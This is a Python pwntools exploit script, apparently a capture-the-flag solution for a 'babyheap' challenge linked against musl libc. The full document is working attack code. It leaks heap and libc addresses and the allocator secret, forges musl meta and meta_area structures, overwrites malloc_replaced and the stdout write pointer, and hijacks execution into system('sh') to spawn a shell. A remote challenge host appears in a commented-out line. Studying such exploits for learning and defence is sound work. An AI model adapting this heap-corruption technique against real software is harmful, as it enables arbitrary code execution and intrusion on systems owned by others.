from pwn import *
context.arch = 'amd64'
filename = "./babyheap"
libc_name = "./libc.so"
r = process(["./babyheap"])
# r = remote('123.60.76.240',60001)
#context.log_level = 'debug'
elf = ELF(filename)
libc = ELF(libc_name)
context.terminal = ['tmux', 'split', '-hp', '60']


def add(name, note, nlen=None):
    r.recvuntil(b'option: ')
    r.sendline(b'1')
    r.recvuntil(b'name size: ')
    r.sendline(str(len(name)).encode('UTF-8'))
    r.recvuntil(b'name: ')
    r.send(name)
    r.recvuntil(b'note size: ')
    if nlen == None:
        r.sendline(str(len(note)).encode('UTF-8'))
    else:
       r.sendline(str(nlen).encode('UTF-8')) 
    r.recvuntil(b'note content: ')
    r.send(note)


def find(name:str):
    r.recvuntil(b'option: ')
    r.sendline(b'2')
    r.recvuntil(b'name size: ')
    r.sendline(str(len(name)).encode("UTF-8"))
    r.recvuntil(b'name: ')
    r.send(str(name).encode("UTF-8"))
    # d = r.recvline().strip()
    # v = d.split(b':')
    # if len(v) == 2:
    #     return binascii.unhexlify(v[1])
    # else:
    #     return None


def delete(name:str):
    r.recvuntil(b'option: ')
    r.sendline(b'3')
    r.recvuntil(b'name size: ')
    r.sendline(str(len(name)).encode("UTF-8"))
    r.recvuntil(b'name: ')
    r.send(str(name).encode("UTF-8"))

def clean():
    r.recvuntil(b'option: ')
    r.sendline(b'4')

def debug():
    gdb.attach(r)
    pause()
## leak heap address, libc base, and most address needed with a fixed offset
add(b'a' ,b'a' ) #
add(b'b'*0x28 ,b'b' *0x28)
add(b'c'*0x28 ,b'c' *0x28)
add(b'c'*0x28 ,b'c' *0x50)
delete('a')
clean()


add(b'a', b'a'*0x28)
add(b'b', b'b')
delete('a')

add(b'c'*0x28 ,b'c' *0x28)
add(b'd'*0x28 ,b'd' *0x28)
add(b'e'*0x28 ,b'e' *0x28)

add(b'f', b'f'*0x50)

find('a')
r.recvuntil(b':')
line = r.recv(16)
heap_ptr = u64(p64(int(line, 16), endianness="big"))
libc_base = heap_ptr - 0xb7aa0
log.info("heap address: " + hex(heap_ptr))
log.info("libc base address: " + hex(libc_base))

stdout_write = libc_base + 0x7ffff7ffb2c8-0x00007ffff7f47000
stdout = libc_base + 0x7ffff7ffb280-0x00007ffff7f47000
secret_addr = libc_base + 0x7ffff7ffbac0-0x00007ffff7f47000
malloc_replaced = libc_base + 0x7ffff7ffdf84-0x00007ffff7f47000
system = libc_base + libc.symbols['system']
#fake_meta_addr = libc_base + 0x7ffff7f30020-0x00007ffff7f47000+0x4000
fake_meta_addr = libc_base - 0x7000 + 0x1020
log.info("stdout_write: " + hex(stdout_write))
log.info("stdout: " + hex(stdout))
log.info("secret_addr: " + hex(secret_addr))
log.info("malloc_replaced: " + hex(malloc_replaced))
log.info("system: " + hex(system))
log.info("fake_meta_addr: %#x" % fake_meta_addr)

add(b'Z'*0x100,b'Z'*0x100)
clean()

## alloc a node as a note to fake a new node whose note point to the secret in __malloc_context, and leak it.

add(b'g'*0x28 ,b'G' *0x28)
add(b'h'*0x50 ,(b'ZZZ'.ljust(0x70,b'\x00')))
delete('g'*0x28)
add(b'i'*0x28 ,b'I' *0x28)
add(b'j'*0x28 ,(p64(heap_ptr+0x4b0)+p64(secret_addr)+p64(3)+p64(0x28)+p64(0)))
find("ZZZ")
r.recvuntil(b":")
line = r.recv(16)
secret = u64(p64(int(line, 16), endianness="big"))
log.info("secret: %#x" % secret)

add(b'Z'*0x28,b'Z'*0x28)
clean()

########## prepare a fake chunk and a fake store
add(b'g'*0x28 ,b'G' *0x28)
add(b'h'*0x50 ,(b'ZZZ'.ljust(0x50,b'\x00')))
delete('g'*0x28)
#add(b'i'*0x28 ,b'I' *0x28)
#add(b'j'*0x28 ,(p64(heap_ptr+0x4b0)+p64(secret_addr)+p64(3)+p64(0x28)+p64(0)))

fake_chunk = flat([fake_meta_addr, 0, 0, 0x0001800000000000]).ljust(0x28, b'A')
#fake_chunk = (p64(fake_meta_addr)+p64(0) + p64(0) + p64( 0x0001800000000000)).ljust(0x28, b'A')
add(b"fake_chunk".ljust(0x28, b'A'), fake_chunk)
fake_store = flat([heap_ptr-0xb0, heap_ptr-0x6d0, 3, 0x28, 0])
#fake_store = (p64(heap_ptr-0xb0)+ p64(heap_ptr-0x6d0)+p64(3)+p64(0x28)+p64(0))
add(b"fake_store".ljust(0x28, b'A'), fake_store)

##### prepare fake meta_area and inject it into malloc_context
fake_area = flat([secret, 0, 1, 0])
#fake_area = p64(secret) + p64(0) + p64(1) + p64(0)
fake_meta = flat([0, 0, heap_ptr-0x6e0, 0, 0x222])
#fake_meta = p64(0) + p64(0) + p64(heap_ptr-0x6e0) + p64(0) + p64(0x222)
add(b"fake_area", b"\x00"*0xfe0+fake_area+fake_meta+b'\n', nlen=0x2000)
delete("ZZZ")
#debug()


#### change mem pointer and rewrite malloc_replaced
delete("fake_area")
#debug()
fake_meta = flat([fake_meta_addr, fake_meta_addr, malloc_replaced-13, 0x0000000100000000, 0x122])
add(b"fake_area", b"\x00"*0xfd0+fake_area+fake_meta+b'\n', nlen=0x2000)
add(b"A", b"\x00"*0x80)

##### change mem pointer and rewrite stdout_write
delete("fake_area")
fake_meta = flat([fake_meta_addr, fake_meta_addr, stdout-0x40, 0x0000000100000000, 0x122])
add(b"fake_area", b"\x00"*0xfc0+fake_area+fake_meta+b'\n', nlen=0x2000)

##### get shell
r.sendlineafter(b"option: ", b"1")
fake_stdout = b'sh'.ljust(0x10, b'\x00')+p64(0)*7+p64(system)*2+p64(fake_meta_addr+0x80)+p64(0)*3+p64(1)+p64(0)
r.sendlineafter(b"name size: ", str(0x80).encode("UTF-8"))
r.send(fake_stdout+b'\n')

r.interactive()
